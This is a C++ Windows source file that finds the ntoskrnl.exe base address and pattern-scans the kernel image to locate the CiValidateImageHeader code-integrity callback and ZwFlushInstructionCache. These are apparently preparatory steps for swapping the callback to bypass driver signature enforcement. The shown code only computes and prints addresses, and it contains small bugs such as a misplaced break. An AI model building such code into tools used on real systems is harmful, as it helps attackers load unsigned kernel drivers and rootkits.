#include "includes.h"


bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
{
    constexpr DWORD maxDrivers = { 1024 };
    LPVOID drivers[maxDrivers];
    DWORD cbNeeded = { 0 };

    // Query loaded kernel drivers
    std::printf( "[*] Enumerating Loaded Drivers...\n" );

    std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );

    if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return false;

    int cDrivers = cbNeeded / sizeof( LPVOID );

    for ( int i = 0; i < cDrivers; ++i ) {
        TCHAR szDriverName[MAX_PATH] = { 0 };

        if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {

            std::wstring driverName( szDriverName );

            if ( _wcsicmp( driverName.c_str(), targetModuleName.c_str() ) == 0 ) {
                globals::nt_base = drivers[i];
                return true;
            }
        }
        else
            std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
    }
    // Failed, just return 0
    return 0;
}


seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {

    std::wcout << ( "[*] Searching Pattern...\n" );

    if ( !modules::EnumerateKernelModules( L"ntoskrnl.exe" ) ) return seCiCallbacks_swap{ 0 };

    std::printf( "[*] Kernel Base Address 0x%p\n", globals::nt_base );

    ULONG_PTR mod_base = ( ULONG_PTR )globals::nt_base;

    HMODULE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
    void* ntoskrnl_ptr = ( void* )usermode_load_va;

    //Calculating the size of the loaded module
    MODULEINFO modinfo;
    GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) );
    std::printf( "[*] Image Size Retrieved: %llx\n", modinfo.SizeOfImage );

    uintptr_t ep = helpers::GetEntryPoint( usermode_load_va );
    std::printf( "[*] ntoskrnl.exe Entry Point: 0x%p\n", ep );

    unsigned char pattern[] = {
        0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 
    };
    const char* mask = "xxx????";

    auto test = ( ULONG_PTR )ntoskrnl_ptr - mod_base;

    std::printf( "[*] ntoskrnl.exe Entry Point: 0x%p\n", test );

    DWORD64 seCiCallbacksInstr = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );

    wprintf( L"[*] Usermode CiCallbacks: 0x%016llX\n", seCiCallbacksInstr );

    DWORD64 KernelOffset = seCiCallbacksInstr - uNtAddr;
    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset );

    DWORD64 kernelAddress = mod_base + KernelOffset;

    DWORD64 zwFlushInstructionCache = ( DWORD64 )helpers::GetProcAddress( ntoskrnl_ptr, L"ZwFlushInstructionCache" ) - uNtAddr + mod_base;

    DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20; // Offset 0x20: Entry point of CiValidateImageHeader within ci.dll (nt!SeValidateImageHeader)

    std::printf( "[*] ciValidateImageHeaderEntry: 0x%p\n", ciValidateImageHeaderEntry );

    std::printf( "[*] zwFlushInstructionCache: 0x%p\n", zwFlushInstructionCache );

    std::printf( "[*] ciValidateImageHeaderEntry: 0x%p\n", kernelAddress );

    system( "pause" );
    return seCiCallbacks_swap{ 0 };
}

uintptr_t helpers::GetEntryPoint( HMODULE moduleBase ) {
    unsigned char* lpBase = reinterpret_cast< unsigned char* >( moduleBase );

    IMAGE_DOS_HEADER* idh = reinterpret_cast< IMAGE_DOS_HEADER* >( lpBase );
    if ( idh->e_magic != IMAGE_DOS_SIGNATURE ) return 0;

    IMAGE_NT_HEADERS64* nt = reinterpret_cast< IMAGE_NT_HEADERS64* >( lpBase + idh->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return 0;

    return reinterpret_cast< uintptr_t >( lpBase + nt->OptionalHeader.AddressOfEntryPoint );
}